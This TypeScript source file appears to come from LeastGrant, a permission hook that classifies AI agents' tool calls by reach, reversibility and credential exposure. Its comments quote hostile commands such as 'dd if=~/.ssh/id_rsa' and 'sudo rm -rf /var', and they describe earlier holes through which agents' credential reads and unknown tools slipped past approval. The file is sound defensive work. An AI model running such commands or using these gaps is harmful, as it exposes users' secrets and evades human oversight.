  // collected — so `tar --directory /etc`, `7z -o/etc`, `curl --cookie-jar
  // ~/.bashrc`, `wget -o /etc/cron.d/x`, `find -fls`, `dd if=~/.ssh/id_rsa` and
  // `git -C /elsewhere` all named a path that no containment or credential
  // check ever saw. Whether a path arrived as a positional or as a flag value
  // says nothing about what it does.
  //
  // Over-collecting is safe here: `looksLikePath` filters out prose, and a
  // target that turns out to be uninteresting changes nothing.
  if (!Array.isArray(j.pathArgs)) {
    for (let i = 1; i < argv.length; i++) {
      const a = argv[i]!;
      if (!a.startsWith('-') || a === '-' || a === '--') continue;
      const eq = a.indexOf('=');
      if (eq > 0) {
        add(a.slice(eq + 1)); // --output=/etc/x
        continue;
      }
      // Attached short-flag values: -o/etc, -fls/etc/x, if=/dev/sda is handled
      // above by the `=` case.
      //
      // The character class has to admit a Windows drive letter as well as
      // `/ ~ .`, or `unzip a.zip -dC:/Windows/Temp` and `tar -CD:/elsewhere -xf`
      // hand back no target at all and read as project-local writes, while the
      // detached spelling of the same flag is correctly seen as outside.
      const attached = /^-[A-Za-z]{1,4}([/~.].*|[A-Za-z]:[\/].*)$/.exec(a);
      if (attached?.[1]) add(attached[1]);
      // Detached value: --directory /etc
      const next = argv[i + 1];
      if (next && !next.startsWith('-')) add(next);
    }
  }

  void root;
  return out;
}

// ---------------------------------------------------------------------------
// Structured tools (Read / Write / Edit / Glob / Grep / WebFetch / MCP / ...)
// ---------------------------------------------------------------------------

export type ToolKind =
  | 'shell'
  | 'read'
  | 'write'
  | 'edit'
  | 'search'
  | 'net'
  | 'mcp'
  | 'spawn'
  | 'meta'
  /** A tool we have never heard of. Deliberately distinct from `meta`. */
  | 'unknown';

/**
 * Map an agent-native tool name onto a kind we understand.
 *
 * Adapters could each do this, but then every adapter would have to be updated
 * when an agent renames a tool, and they would drift. One table.
 */
export function normalizeTool(tool: string): ToolKind {
  if (tool.startsWith('mcp__')) return 'mcp';
  const t = tool.toLowerCase().replace(/[^a-z]/g, '');
  if (['bash', 'shell', 'runterminalcmd', 'executecommand', 'terminal', 'runcommand', 'execute'].includes(t)) return 'shell';
  if (['read', 'readfile', 'view', 'catfile', 'openfile'].includes(t)) return 'read';
  if (['write', 'writefile', 'createfile', 'newfile'].includes(t)) return 'write';
  if (['edit', 'editfile', 'strreplace', 'strreplaceeditor', 'applypatch', 'multiedit', 'notebookedit', 'searchreplace'].includes(t)) return 'edit';
  if (['glob', 'grep', 'search', 'codebasesearch', 'filesearch', 'ripgrep', 'listdir', 'ls'].includes(t)) return 'search';
  if (['webfetch', 'fetch', 'webseach', 'websearch', 'browser', 'httprequest'].includes(t)) return 'net';
  if (['task', 'agent', 'spawnagent', 'subagent'].includes(t)) return 'spawn';

  // Tools that genuinely have no effect outside the conversation. This is an
  // allowlist on purpose. The old default was `meta`, which carries NIL_BLAST
  // and therefore tier 0 — so any tool name we did not recognise was
  // auto-approvable on sight, including real ones like `delete_file` and
  // `run_in_terminal`. "I have not heard of this" is not the same as
  // "this is harmless".
  if (
    [
      // Deliberately short. Anything whose name is not on this list is
      // 'unknown', and 'unknown' asks.
      //
      // Removed after the audit, because I had assumed rather than checked:
      //   senduserfile   uploads a local file off the machine
      //   croncreate     schedules a prompt to run later — persistence
      //   schedulewakeup the same
      //   notebookread   reads an arbitrary file, including a credential file
      // Every one of those was sitting at NIL_BLAST, the most permissive
      // classification available, on the strength of a guess.
      'todowrite', 'todoread', 'exitplanmode', 'enterplanmode', 'thinking',
      'askuserquestion', 'reportfindings', 'listmcpresources',
      'taskoutput', 'tasklist', 'cronlist', 'markchapter',
    ].includes(t)
  ) {
    return 'meta';
  }
  return 'unknown';
}

function analyzeStructured(
  kind: ToolKind,
  req: Request,
  kctx: KnowledgeCtx,
  sctx: SignatureCtx,
  root: string,
): Action {
  const input = req.input;
  const filePath = firstString(input, ['file_path', 'path', 'filePath', 'target_file', 'filename', 'notebook_path']);

  if (kind === 'read' || kind === 'edit' || kind === 'write') {
    // `kctx.resolve` never returns an empty string for a non-empty argument —
    // an unplaceable path comes back marked, not missing. That is what makes
    // the `abs ? ... : ...` guards below mean "was a path named at all", which
    // is the question they read like. When resolve *could* return '' this same
    // code meant "did we manage to place it", so `Read
    // C:\pagefile.sys\..\..\~\.aws\credentials` produced an action with no
    // target, no exposure and therefore no floor.
    const abs = filePath ? kctx.resolve(filePath) : '';
    const secret = abs ? kctx.isSecret(abs) : false;
    const inside = abs ? kctx.inWorkspace(abs) : false;
    const capability: Capability =
      kind === 'read'
        ? secret
          ? 'secret.read'
          : inside
            ? 'fs.read.workspace'
            : 'fs.read.outside'
        : inside
          ? 'fs.write.workspace'
          : 'fs.write.outside';

    const blast: BlastRadius = {
      reach: inside ? 'workspace' : 'machine',
      // An edit to a tracked file is trivially recoverable; a write outside the
      // project may be overwriting something nobody has a copy of.
      reversibility: kind === 'read' ? 'trivial' : inside ? 'easy' : 'hard',
      exposure: secret ? 'reads-secrets' : 'none',
      scale: 'single',
    };

    return {
      kind: kind === 'read' ? 'file.read' : kind === 'write' ? 'file.write' : 'file.edit',
      capability,
      signature: toolSignature(req.tool, [filePath ? normalizeArg(filePath, sctx) : '?']),
      display: `${req.tool} ${abs ? displayPath(abs, root) : (filePath ?? '?')}`,
      blast,
      targets: abs ? [{ type: 'path', value: abs, inWorkspace: inside, secret }] : [],
      understood: Boolean(filePath),
      notes: secret ? ['this file holds credentials'] : [],
    };
  }

  if (kind === 'search') {
    // `Glob` carries its target in `pattern`, not in `path` — and `pattern` can
    // be fully qualified: `Glob { pattern: "~/.ssh/*" }` names a directory
    // outside the project as surely as `Glob { path: "~/.ssh" }` does, but only
    // the second was resolved. The pattern is considered whenever it looks like
    // a path rather than a bare `*.ts`, and the more dangerous of the two wins.
    const where = firstString(input, ['path', 'dir', 'directory']) ?? req.cwd;
    const pattern = firstString(input, ['pattern', 'glob']) ?? '';
    const patternDir = pattern && looksLikePath(pattern) ? pattern.replace(/[\/][^\/]*[*?[][^\/]*$/, '') : '';
    const whereAbs = kctx.resolve(where);
    const patAbs = patternDir ? kctx.resolve(patternDir) : '';
    // Prefer whichever names somewhere we would rather ask about.
    const abs =
      patAbs && (kctx.isSecret(patAbs) || !kctx.inWorkspace(patAbs)) ? patAbs : whereAbs;
    const inside = abs ? kctx.inWorkspace(abs) : false;

    // A search that prints matching *lines* is a read of the file's contents,
    // not just of its name. `Grep --output_mode content` over `.env` hands the
    // credential to the agent exactly as `cat` would, and only the directory
    // was being examined.
    const mode = safeString(input['output_mode']);
    const showsContent = mode === 'content' || Boolean(input['-A'] ?? input['-B'] ?? input['-C']);
    // Whichever location decided the verdict is the one the identity is built
    // from. Otherwise `Glob {pattern: "~/.ssh/*"}` and `Glob {pattern: "**/*.ts"}`
    // both sign as `Glob(<path>, names)` — `where` is the cwd for both — and two
    // searches of very different places share one learned thing.
    const subject = abs === patAbs && patternDir ? patternDir : where;
    const glob = safeString(input['glob']);
    const secretHere =
      (abs ? kctx.isSecret(abs) : false) ||
      (showsContent && glob ? kctx.isSecret(kctx.resolve(glob)) : false);
    // A content search descends. `Grep {path: "~/.ssh", output_mode: "content"}`
    // was floored and `Grep {path: "~", output_mode: "content"}` — which reads
    // `~/.ssh` and `~/.aws` and every `.env` on the machine — was not, because
    // the judgement asked only whether the one named directory was itself a
    // credential store. Naming the parent was enough to turn a deny into an
    // abstain on the adapters that do not prompt.
    const sweeps = Boolean(showsContent && abs && kctx.isCredentialTree(abs));
    if (secretHere || (showsContent && abs && kctx.isSecret(abs)) || sweeps) {
      return {
        kind: 'file.read',
        capability: 'secret.read',
        signature: toolSignature(req.tool, [normalizeArg(subject, sctx), showsContent ? 'content' : 'names']),
        display: `${req.tool} in ${abs ? displayPath(abs, root) : where}`,
        blast: { reach: 'machine', reversibility: 'trivial', exposure: 'reads-secrets', scale: sweeps ? 'sweeping' : 'many' },
        targets: abs ? [{ type: 'path', value: abs, inWorkspace: inside, secret: true }] : [],
        understood: true,
        notes: [
          sweeps && !secretHere
            ? 'this prints the contents of every file under a directory that holds credentials'
            : 'this prints the contents of a file that holds credentials',
        ],
      };
    }

    return {
      kind: 'search',
      capability: inside ? 'fs.read.workspace' : 'fs.read.outside',
      signature: toolSignature(req.tool, [normalizeArg(subject, sctx), showsContent ? 'content' : 'names']),
      display: `${req.tool} in ${abs ? displayPath(abs, root) : where}`,
      blast: { reach: inside ? 'workspace' : 'machine', reversibility: 'trivial', exposure: 'none', scale: 'many' },
      targets: abs ? [{ type: 'path', value: abs, inWorkspace: inside, secret: false }] : [],
      understood: true,
      notes: [],
    };
  }

  if (kind === 'net') {
    const url = firstString(input, ['url', 'uri', 'query', 'q']) ?? '';
    const host = /^[a-z][a-z0-9+.-]*:\/\/(?:[^@/]*@)?([^/:?#\s]+)/i.exec(url)?.[1]?.toLowerCase();
    return {
      kind: 'net',
      capability: 'net.fetch',
      signature: toolSignature(req.tool, [host ? `<url:${host}>` : '<query>']),
      display: redact(`${req.tool} ${url.slice(0, 100)}`),
      blast: { reach: 'network', reversibility: 'trivial', exposure: 'none', scale: 'single' },
      targets: host ? [{ type: 'host', value: host }] : [],
      understood: true,
      notes: [],
    };
  }

  if (kind === 'mcp') {
    // `mcp__server__tool`. We cannot see inside an MCP server, so the only
    // evidence available is the tool's own name — which, by near-universal
    // convention, starts with a verb. That is weak evidence, but it is the same
    // heuristic the cloud module applies to `aws describe-*` versus
    // `aws delete-*`, and it beats the alternative of treating every MCP call
    // as maximally dangerous, which would make LeastGrant unusable for anyone
    // whose workflow is MCP-shaped.
    //
    // Being wrong here is bounded: a read-shaped name still only reaches tier
    // 2, which needs explicit human approval before it stops asking.
    const parts = req.tool.split('__');
    const server = parts[1] ?? 'unknown';
    const toolName = (parts[2] ?? '').toLowerCase();
    const verb = toolName.split(/[_-]/)[0] ?? '';

    const shape = MCP_READ_VERBS.has(verb)
      ? 'read'
      : MCP_EXEC_VERBS.has(verb)
        ? 'exec'
        : 'write';

    const blast: BlastRadius =
      shape === 'read'
        ? { reach: 'network', reversibility: 'trivial', exposure: 'none', scale: 'single' }
        : shape === 'exec'
          ? { reach: 'machine', reversibility: 'hard', exposure: 'none', scale: 'single' }
          : { reach: 'external', reversibility: 'hard', exposure: 'none', scale: 'single' };

    const note =
      shape === 'read'
        ? `asks the ${server} MCP server for information; LeastGrant cannot see what it does internally`
        : shape === 'exec'
          ? `runs something through the ${server} MCP server, which LeastGrant cannot inspect`
          : `changes something through the ${server} MCP server, which LeastGrant cannot inspect`;

    // The arguments are part of the identity. Without them a single approved
    // call teaches LeastGrant to allow every other call to the same tool,
    // whatever it is asked to do — the widest collision the system had.
    const argShape = mcpArgSignature(input, sctx, req.tool);

    // Any path an argument names, so the credential floor has something to fire
    // on.
    //
    // An MCP call used to produce exactly one target — the server — and
    // `exposure: 'none'`, unconditionally. `guard.secret-read` is gated on
    // exposure or capability, so it could not fire for an MCP call at all, and
    // there was no backstop anywhere: a filesystem MCP server reading
    // `~/.ssh/id_rsa` was a `mcp.call` to `filesystem` and nothing more.
    //
    // That mattered most in combination with the batch-signature bug fixed in
    // signature.ts, but it is a hole on its own. The engine already knows how
    // to recognise a credential path; the MCP branch simply never handed it
    // one. It does now, and if any of them is a credential the call is a
    // credential read, whatever the tool is called.
    const paths = mcpPathArguments(input, sctx);
    const targets: Target[] = [{ type: 'service', value: server }, ...paths];
    const readsSecret = paths.some((t) => t.secret);

    return {
      kind: 'mcp',
      capability: readsSecret ? 'secret.read' : 'mcp.call',
      signature: `${req.tool}${argShape}`,
      display: `${req.tool}${argShape}`,
      blast: readsSecret ? { ...blast, exposure: 'reads-secrets' } : blast,
      targets,
      understood: true,
      notes: readsSecret
        ? [note, 'one of the paths in this call is a credential file']
        : [note],
    };
  }

  if (kind === 'spawn') {
    // A subagent can be launched with its own permission mode and its own
    // isolation. `Task` trained on ordinary use must not cover a subagent
    // launched into bypass.
    const mode = safeString(input['permissionMode'] ?? input['permission_mode']);
    const isolation = safeString(input['isolation']);
    if (mode || isolation) {
      return {
        kind: 'meta',
        capability: 'agent.spawn',
        signature: toolSignature(req.tool, [mode ? `mode:${mode}` : '', isolation ? `isolation:${isolation}` : ''].filter(Boolean)),
        display: `${req.tool}${mode ? ' (' + mode + ')' : ''}${isolation ? ' [' + isolation + ']' : ''}`,
        blast: {
          reach: 'machine',
          reversibility: 'hard',
          exposure: 'none',
          scale: 'many',
        },
        targets: [],
        understood: false,
        notes: [
          mode
            ? `starts a subagent in "${mode}" mode, which is not the mode this session is in`
            : `starts a subagent with isolation "${isolation}"`,
        ],
      };
    }
    return {
      kind: 'meta',
      capability: 'agent.spawn',
      signature: toolSignature(req.tool, []),
      display: req.tool,
      blast: { reach: 'workspace', reversibility: 'easy', exposure: 'none', scale: 'many' },
      targets: [],
      understood: true,
      notes: ['a subagent runs with the same permissions, and its actions are checked individually'],
    };
  }

  if (kind === 'unknown') {
    // We do not know what this tool does, which is not the same as knowing it
    // does nothing. Falling through to `meta` gave every unrecognised tool
    // NIL_BLAST and tier 0 — auto-approvable on sight, including real tools
    // such as `delete_file` and `run_in_terminal`.
    return {
      kind: 'exec',
      capability: 'exec.unknown',
      signature: toolSignature(req.tool, []),
      display: req.tool,
      blast: { reach: 'machine', reversibility: 'hard', exposure: 'none', scale: 'single' },
      targets: [],
      understood: false,
      notes: [`LeastGrant does not recognise the tool "${req.tool}", so it cannot say what it does`],
    };
  }

  return {
    kind: 'meta',
    capability: 'meta',
    signature: toolSignature(req.tool, []),
    display: req.tool,
    blast: NIL_BLAST,
    targets: [],
    understood: true,
    notes: [],
  };
}

// ---------------------------------------------------------------------------

/**
 * Which of two capabilities describes the more consequential action.
 * Used when a redirect turns a reader into a writer.
 */
function worseCapability(a: Capability, b: Capability): Capability {
  const rank = (c: Capability) =>
    c === 'fs.write.outside' || c === 'fs.delete' ? 3 : c === 'fs.write.workspace' ? 2 : 1;
  return rank(b) > rank(a) ? b : a;
}

/**
 * A signature fragment describing the command's output redirects.
 *
 * Without this, `echo hi` and `echo hi > ~/.bashrc` share a signature, so
 * approving the first teaches LeastGrant to allow the second. Targets are
 * normalized like any other argument, so the inside/outside/secret distinction
 * survives into the learned identity.
 */
function redirectSignature(
  redirects: { op: string; target: string; isFile: boolean }[],
  sctx: SignatureCtx,
): string {
  // Input redirects join the signature too. Filtering on `>` left
  // `grep -n TODO` and `grep -n TODO < ~/.ssh/id_rsa` sharing one learned
  // identity, so approvals of the first covered the second.
  const parts = redirects
    .filter((r) => r.isFile)
    .map((r) => {
      const op = r.op.replace(/^\d+/, '');
      // A heredoc's target is its delimiter and a here-string's is its content.
      // Neither is a path, and the second should not be reproduced at all — a
      // signature is stored, and `<<< "$SECRET"` would store it.
      if (op !== '<' && op.startsWith('<')) return op;
      return op + ' ' + normalizeArg(r.target, sctx);
    })
    .sort();
  return parts.length ? ' ' + parts.join(' ') : '';
}

const REACH_ORDER = ['none', 'workspace', 'machine', 'network', 'external', 'production'] as const;

function worseReach(a: BlastRadius['reach'], b: BlastRadius['reach']): BlastRadius['reach'] {
  return REACH_ORDER.indexOf(a) >= REACH_ORDER.indexOf(b) ? a : b;
}

const REVERSIBILITY_ORDER = ['trivial', 'easy', 'hard', 'irreversible'] as const;

function worseReversibility(
  a: BlastRadius['reversibility'],
  b: BlastRadius['reversibility'],
): BlastRadius['reversibility'] {
  return REVERSIBILITY_ORDER.indexOf(a) >= REVERSIBILITY_ORDER.indexOf(b) ? a : b;
}

function kindFor(c: Capability): ActionKind {
  if (c.startsWith('net.')) return 'net';
  if (c === 'fs.delete') return 'file.delete';
  if (c.startsWith('fs.write')) return 'file.write';
  if (c.startsWith('fs.read') || c === 'secret.read') return 'file.read';
  if (c === 'mcp.call') return 'mcp';
  if (c === 'meta') return 'meta';
  return 'exec';
}

/**
 * Coerce an untrusted value to a string without ever throwing.
 *
 * `String(x)` is not total. `String({toString: 'curl'})` raises "Cannot convert
 * object to primitive value", and so does any object with a null prototype or a
 * hostile `Symbol.toPrimitive`. That matters more here than it looks: tool
 * input arrives as JSON from a process LeastGrant does not control, and a throw
 * anywhere in `analyze` means the hook emits no decision at all — which in
 * `bypassPermissions` mode is the agent's permissions deciding, i.e. yes.
 *
 * A value that is not a string is also not something we can reason about, so it
 * comes back as the unresolved marker rather than as an empty string. Empty
 * would read as "no command", which is harmless; unresolved reads as "something
 * is here and we cannot see it", which is the truth.
 *
 * That last paragraph was a description of the intent, not of the code. Arrays
 * and objects have a `toString`, so they took the `String(v)` path and came
 * back as a plausible-looking string that no shell would ever produce.
 * `String(["sudo","rm","-rf","/var"])` is `"sudo,rm,-rf,/var"` — one token,
 * whose program name is `var` — so an argv array sent by an agent that had not
 * translated it lost its arguments, its targets, its floor and its identity all
 * at once, and three different commands collapsed onto the signature `var`.
 * Coercion that *invents* structure is worse than refusing: a wrong answer that
 * looks like a right one.
 *
 * So the rule matches the intent: only a value that already *is* a scalar can
 * become one. Translating an argv array into a shell string is a real job with
 * real quoting rules, and it belongs in the adapter that knows the wire format
 * (see `translate()` in the Codex adapter), not in a defensive coercion helper.
 */
export function safeString(v: unknown): string {
  if (typeof v === 'string') return v;
  if (v === null || v === undefined) return '';
  if (typeof v === 'number' || typeof v === 'boolean' || typeof v === 'bigint') return String(v);
  return UNRESOLVED;
}

function firstString(obj: Record<string, unknown>, keys: string[]): string | undefined {
  for (const k of keys) {
    const v = obj[k];
    if (typeof v === 'string' && v) return v;
  }
  return undefined;
}

/** Render argv for display, shortening workspace paths. */
function renderArgv(argv: string[], root: string): string {
  return argv
    .map((a, i) => {
      if (i === 0) return a;
      if (looksLikePath(a)) {
        const c = canonicalize(a, root);
        if (c.abs) return displayPath(c.abs, root);
      }
      return /\s/.test(a) ? JSON.stringify(a) : a;
    })
    .join(' ');
}

/**
 * Every path an MCP call's arguments name, at any depth.
 *
 * MCP arguments are arbitrary JSON and their key names are the server's
 * business, not ours, so this is shape-driven rather than key-driven: any
 * string anywhere in the payload that looks like a path is resolved and
 * checked. `looksLikePath` is the same predicate the signature templater
 * already uses to decide whether a string is a path, so a value that gets
 * templated as `<path:secret>` in the identity is a path target here too —
 * the two cannot drift apart and disagree about what a credential is.
 *
 * Bounded, because a payload is attacker-shaped: a batch of a thousand files
 * should not turn one permission check into a thousand path resolutions on the
 * hot path. The cap is generous next to any real batch, and it is a cap on the
 * targets *reported*, not on the check — a credential anywhere in the first
 * few hundred entries still marks the call.
 */
function mcpPathArguments(input: Record<string, unknown>, sctx: SignatureCtx): Target[] {
  const out: Target[] = [];
  const seen = new Set<string>();
  let budget = 256;

  const walk = (v: unknown, depth: number): void => {
    if (budget <= 0 || depth > 4) return;
    if (typeof v === 'string') {
      budget -= 1;
      if (!sctx.looksLikePath(v)) return;
      const abs = sctx.resolve(v);
      if (!abs || seen.has(abs)) return;
      seen.add(abs);
      out.push({
        type: 'path',
        value: abs,
        inWorkspace: sctx.inWorkspace(abs),
        secret: sctx.isSecret(abs),
      });
      return;
    }
    if (Array.isArray(v)) {
      for (const el of v) walk(el, depth + 1);
      return;
    }
    if (v && typeof v === 'object') {
      for (const el of Object.values(v as Record<string, unknown>)) walk(el, depth + 1);
    }
  };

  walk(input, 0);
  return out;
}

